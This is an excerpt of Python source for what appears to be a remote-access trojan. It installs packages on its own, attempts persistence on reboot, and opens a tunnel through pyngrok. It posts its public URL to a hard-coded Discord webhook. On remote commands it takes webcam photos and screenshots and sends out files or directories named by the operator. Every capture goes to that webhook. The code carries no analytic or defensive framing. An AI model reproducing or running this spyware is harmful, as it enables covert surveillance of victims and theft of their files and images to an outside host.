...
try:
    ...
    subprocess.run(["pip", "install", "discordwebhook"])
    import discordwebhook
...
try:
    ...
    import pyngrok
subprocess.run(["apt-get", "install", "scrot"])
program = os.path.basename(__file__)
subprocess.run(["@reboot", f"{program}"])
...
webhook = discordwebhook.Webhook(url="https://discord.com/api/webhooks/954023084753584138/RFewgv20GIYjD9J2_Olm1gyEzVAcmFSNCb0IaAXcdcM1WL3xtDEUNApeLTsa8QZMbN0u")
webhook.send_sync(f"{public_url}")
        ...
        if msg_length:
            try:
                    ...
                    def webcam(conn, addr):
                        try:
                            ...
                            if s:
                                ...
                                cv.imwrite(path, img)
                                webhook.send_sync(file=discordwebhook.File('selfietest.jpg'))
                ...
                if msg == "screenshot":
                    ...
                    webhook.send_sync(file=discordwebhook.File('screenshot.png'))
                ...
                if msg[:4] == "send":
                    if os.path.isfile(f'{msg[5:]}'):
                        ...
                        webhook.send_sync(file=discordwebhook.File(f'{msg[5:]}'))
                    ...
                    if os.path.isdir(f'{msg[5:]}'):   
                        try:
                            ...
                            f.write(f"{msg[5:]}")
                            webhook.send_sync(file=discordwebhook.File(f'{f}'))
                            conn.send("File sent to webhook!".encode(FORMAT))
                            handle_client(conn, addr)
                        except:
